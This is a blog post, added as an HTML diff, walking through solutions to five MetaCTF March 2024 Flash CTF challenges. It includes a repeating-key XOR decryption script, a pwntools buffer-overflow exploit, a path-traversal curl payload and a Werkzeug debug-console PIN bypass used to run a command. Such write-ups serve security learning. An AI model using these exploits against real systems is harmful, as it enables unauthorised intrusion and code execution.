@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️🏴 MetaCTF March 2024 Flash CTF</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+        <main class="container">
+            
+    <h1 class="title">
+        ️🏴 MetaCTF March 2024 Flash CTF
+    </h1>
+    <blockquote>A monthly mini CTF competition organized by MetaCTF and Antisyphon.</blockquote>
+    <p class="subtitle text-end"><strong>2024-03-22</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/ctf/" >
+                        #ctf
+                    </a>
+                
+            </small>
+        </p>
+    
+    <h2 id="metactf-march-2024-flash-ctf">MetaCTF March 2024 Flash CTF</h2>
+<blockquote>
+<p><em>A monthly mini CTF competition organized by MetaCTF with support from
+Antisyphon Training and TCM Security.</em></p>
+</blockquote>
+<h3 id="camping-adventures">Camping Adventures</h3>
+<blockquote>
+<p><em>My friend went camping near some beautiful lake the other day and sent me a
+photo, but they refuse to tell me where it was!</em></p>
+<p><img src="https://metaproblems.com/f95246689bf80875673db4b3570be2ba/lake.jpg" alt="lake.jpg" /></p>
+<p><em>Can you help me figure out the name of that lake?</em></p>
+<p><em>Simply enter the name of the lake as the flag. It does not need to be in the
+MetaCTF{} format.</em></p>
+</blockquote>
+<p>Taking a quick look at the JPEG's metadata:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> exiftool lake.jpg | </span><span style="color:#bf616a;">rg</span><span> GPS
+</span><span style="color:#bf616a;">GPS</span><span> Latitude Ref                : North
+</span><span style="color:#bf616a;">GPS</span><span> Longitude Ref               : West
+</span><span style="color:#bf616a;">GPS</span><span> Latitude                    : 39 deg 9&#39;</span><span style="color:#a3be8c;"> 7.99&quot; N
+</span><span style="color:#a3be8c;">GPS Longitude                   : 106 deg 24</span><span>&#39; 20.73&quot;</span><span style="color:#a3be8c;"> W
+</span><span style="color:#a3be8c;">GPS Position
+</span></code></pre>
+<p>Converting that to the format more readily accepted by Google
+Maps—<code>39°09'07.99"N 106°24'20.73"W</code>—shows that this is "Emerald Lake"
+(somewhere in Colorado), which is the flag.</p>
+<h3 id="26-dimensions">26 Dimensions</h3>
+<blockquote>
+<p><em>The supercomputing center just put out
+<a href="https://metaproblems.com/e59fa86469ee27e097765a8dd60c6b61/physics-checker">a program</a>
+that checks physics theories for correctness. Can you figure out the answer
+to the universe and everything?</em></p>
+<p><em>Perhaps it's not as smart as they claim it is, and it has the answer
+hardcoded?</em></p>
+</blockquote>
+<p>This one is hiding in plain sight:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> strings physics-checker | </span><span style="color:#bf616a;">rg</span><span> Meta
+</span><span style="color:#bf616a;">MetaCTF{wow_ther3s_lik3_littl3_str1ng5_1n_stuff</span><span>}
+</span></code></pre>
+<h3 id="xylophone-network-graphics">Xylophone Network Graphics</h3>
+<blockquote>
+<p><em>I generated
+<a href="https://metaproblems.com/a200e0724f29c00c9700dcbc4c38f363/encrypted.xpng">some art</a>
+as a PNG image, and then encrypted the file using an 8-character-long key
+that was repeated.</em></p>
+<p><em>I can't remember what it was! Can you help me decrypt the image and retrieve
+the flag?</em></p>
+</blockquote>
+<p>According to the
+<a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html"><em>PNG (Portable Network Graphics) Specification, Version 1.2</em></a>:</p>
+<blockquote>
+<p><em>The first eight bytes of a PNG file always contain the following (decimal)
+values:</em></p>
+<p><code>137 80 78 71 13 10 26 10</code></p>
+</blockquote>
+<p>With an 8-character key and an 8-byte header, this is effectively a
+known-plaintext attack:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">encrypted.xpng</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">rb</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>i:
+</span><span>    encrypted = i.</span><span style="color:#bf616a;">read</span><span>()
+</span><span>
+</span><span>header = (</span><span style="color:#bf616a;">int</span><span>(b) </span><span style="color:#b48ead;">for </span><span>b </span><span style="color:#b48ead;">in </span><span>&quot;</span><span style="color:#a3be8c;">137 80 78 71 13 10 26 10</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>())
+</span><span>key = [a ^ b </span><span style="color:#b48ead;">for </span><span>a, b </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">zip</span><span>(encrypted[:</span><span style="color:#d08770;">8</span><span>], header)]
+</span><span>
+</span><span>chunks = (encrypted[i:i+</span><span style="color:#d08770;">8</span><span>] </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(encrypted), </span><span style="color:#d08770;">8</span><span>))
+</span><span>
+</span><span>decrypted = (
+</span><span>    key[i] ^ c
+</span><span>    </span><span style="color:#b48ead;">for </span><span>chunk </span><span style="color:#b48ead;">in </span><span>chunks
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i, c </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">enumerate</span><span>(chunk)
+</span><span>)
+</span><span>
+</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">decrypted.png</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">wb</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>o:
+</span><span>    o.</span><span style="color:#bf616a;">write</span><span>(</span><span style="color:#bf616a;">bytes</span><span>(decrypted))
+</span></code></pre>
+<p>That decrypted PNG is:</p>
+<p><img src="/img/metactf-march-2024-flash-ctf-decrypted.png" alt="decrypted.png" /></p>
+<p>…which, beneath the glorious WordArt, reads:</p>
+<pre data-lang="txt" style="background-color:#2b303b;color:#c0c5ce;" class="language-txt "><code class="language-txt" data-lang="txt"><span>MetaCTF{kn0wn_pl4int3xt_d3cryption}
+</span></code></pre>
+<h3 id="how-cool-are-you">How Cool Are You?</h3>
+<blockquote>
+<p><em>Are you cool enough to get in? Connect via <code>nc kubenode.mctf.io 30005</code> and
+find out.</em></p>
+<p><em>You can grab the
+<a href="/img/metactf-march-2024-flash-ctf-decrypted.jpg">binary here</a>, and the
+<a href="https://metaproblems.com/3a684429dd66e9c497112cca3f69f676/chal.c">source here</a>.
+Good luck.</em></p>
+</blockquote>
+<p>The challenge itself greets me with something I've always known:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">──</span><span>(root㉿psy-xps-13)</span><span style="color:#bf616a;">-[/mnt]
+</span><span style="color:#bf616a;">└─#</span><span> ./chal
+</span><span style="color:#bf616a;">Whoa</span><span> there, my dude. Only the truly cool are allowed in here.
+</span><span style="color:#bf616a;">What</span><span>&#39;</span><span style="color:#a3be8c;">s your name? PsypherPunk
+</span><span style="color:#a3be8c;">PsypherPunk, it looks like your coolness value is 6990.
+</span><span style="color:#a3be8c;">I</span><span>&#39;</span><span style="color:#bf616a;">m</span><span> sorry, you&#39;</span><span style="color:#a3be8c;">re just not cool enough. Get lost!
+</span></code></pre>
+<p>Harsh but fair.</p>
+<p>The input name is stored in a <code>char[64]</code> which is read via an unsafe <code>gets()</code>,
+which is ripe for a buffer-overflow. Specifically, <code>your_name</code> needs to
+overflow that boundary, then write <em>exactly</em> 1,500,000,001 into the next
+variable <code>your_estimated_coolness</code>.</p>
+<p>Expressed as little-endian bytes, that's:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>&gt;&gt;&gt; int.</span><span style="color:#bf616a;">to_bytes</span><span>(</span><span style="color:#d08770;">1500000001</span><span>, </span><span style="color:#d08770;">4</span><span>)[::-</span><span style="color:#d08770;">1</span><span>]
+</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x01</span><span style="color:#a3be8c;">/hY</span><span>&#39;
+</span></code></pre>
+<p>However, it's not just 64 bytes plus that: <code>your_name</code> is not necessarily
+adjacent to <code>your_estimated_coolness</code>. So iterating locally using
+<code>pwntools.process</code>, it's actually <em>76</em> bytes needed to overflow:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span>process, remote
+</span><span>
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">kubenode.mctf.io</span><span>&quot;, </span><span style="color:#d08770;">30005</span><span>)
+</span><span>
+</span><span style="color:#bf616a;">_ </span><span>= p.</span><span style="color:#bf616a;">readuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">What&#39;s your name? </span><span>&quot;)
+</span><span>
+</span><span>name = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">76 </span><span>+ int.</span><span style="color:#bf616a;">to_bytes</span><span>(</span><span style="color:#d08770;">1500000001</span><span>, </span><span style="color:#d08770;">4</span><span>)[::-</span><span style="color:#d08770;">1</span><span>]
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(name)
+</span><span>
+</span><span style="color:#bf616a;">_ </span><span>= p.</span><span style="color:#bf616a;">readuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Oh, right</span><span>&quot;)
+</span><span style="color:#96b5b4;">print</span><span>(p.</span><span style="color:#bf616a;">readline</span><span>().</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">split</span><span>()[-</span><span style="color:#d08770;">1</span><span>])
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">close</span><span>()
+</span></code></pre>
+<p>That results in:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">┌──</span><span>(root㉿psy-xps-13)</span><span style="color:#bf616a;">-[/mnt]
+</span><span style="color:#bf616a;">└─#</span><span> ./how-cool-are-you.py
+</span><span style="color:#bf616a;">[+]</span><span> Opening connection to kubenode.mctf.io on port 30005: Done
+</span><span style="color:#bf616a;">MetaCTF{oh_w0w_y0ur3_pr3tty_c00l_aft3r_a11</span><span>}
+</span><span style="color:#bf616a;">[*]</span><span> Closed connection to kubenode.mctf.io port 30005
+</span></code></pre>
+<h3 id="flaskform-pharmaceuticals">FlaskForm Pharmaceuticals</h3>
+<blockquote>
+<p><em>We at FlaskForm Pharmaceuticals have been developing potions for ages, but
+we just developed our new website! Come check it out! Spawn an instance
+below to get started.</em></p>
+<p><em>You can download the source code
+<a href="https://metaproblems.com/c56ba06dde50b26c64cce8894d4305c6/FlaskForm_Pharma.zip">here</a>.</em></p>
+</blockquote>
+<p>When running this locally, the flag can be read locally via a simple LFI;
+remotely, however:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> curl http://dphltvzl.chals.mctf.io/products/detail \
+</span><span>∙</span><span style="color:#bf616a;">     --request</span><span> POST \
+</span><span>∙</span><span style="color:#bf616a;">     --header </span><span>&#39;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&#39; \
+</span><span>∙</span><span style="color:#bf616a;">     --data-raw </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;file&quot;:&quot;../flag.txt&quot;}</span><span>&#39;
+</span><span style="color:#bf616a;">{</span><span>&quot;</span><span style="color:#a3be8c;">content</span><span>&quot;</span><span style="color:#bf616a;">:</span><span>&quot;</span><span style="color:#a3be8c;">[Errno 13] Permission denied: &#39;./potion_details/../flag.txt&#39;</span><span>&quot;}
+</span></code></pre>
+<p>The error is due to the <code>Dockerfile</code> setup:</p>
+<pre data-lang="docker" style="background-color:#2b303b;color:#c0c5ce;" class="language-docker "><code class="language-docker" data-lang="docker"><span>RUN chmod 555 /app/readflag
+</span><span>RUN chmod 400 /app/flag.txt
+</span><span>RUN chown root:root /app/flag.txt
+</span><span>RUN chmod u+s /app/readflag
+</span></code></pre>
+<p>The Flask instance, however, is running in debug mode:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_server</span><span>():
+</span><span>    </span><span style="color:#bf616a;">run_simple</span><span>(&#39;</span><span style="color:#a3be8c;">0.0.0.0</span><span>&#39;, </span><span style="color:#d08770;">8000</span><span>, app, </span><span style="color:#bf616a;">use_reloader</span><span>=</span><span style="color:#d08770;">True</span><span>, </span><span style="color:#bf616a;">use_debugger</span><span>=</span><span style="color:#d08770;">True</span><span>, </span><span style="color:#bf616a;">use_evalex</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span></code></pre>
+<p>…so the console is available at <code>/console</code> but is protected by a generated
+PIN. Similar to the HackTheBox challenge
+<a href="https://app.hackthebox.com/challenges/DeSynth%2520Recruit"><em>Desynth Recruit</em></a>
+(which I coincidentally solved not too long ago), it's possible to use
+<a href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass"><code>wdahlenburg/werkzeug-debug-console-bypass</code></a>
+in combination with the LFI to leak the associated details and to determine the
+PIN.</p>
+<p>Once the PIN's generated, the console allows the <code>readflag</code> binary to be read:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span>&gt;&gt;&gt; import </span><span style="color:#bf616a;">os
+</span><span>&gt;&gt;&gt; print(</span><span style="color:#bf616a;">os.popen</span><span>(&quot;</span><span style="color:#a3be8c;">/app/readflag</span><span>&quot;).read())
+</span><span style="color:#bf616a;">MetaCTF{m4g1c4l_fl4sks_sh3lv3d_4nd_f1led</span><span>}
+</span></code></pre>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2024 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
